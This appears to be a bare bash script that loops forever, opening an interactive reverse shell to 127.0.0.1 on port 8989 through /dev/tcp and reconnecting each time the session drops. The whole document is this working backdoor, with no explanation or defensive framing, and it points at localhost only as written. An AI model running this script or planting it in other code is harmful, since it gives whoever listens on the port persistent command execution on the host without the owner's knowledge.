while true
do
clear
bash -i > /dev/tcp/127.0.0.1/8989 0<&1 2>&1
done
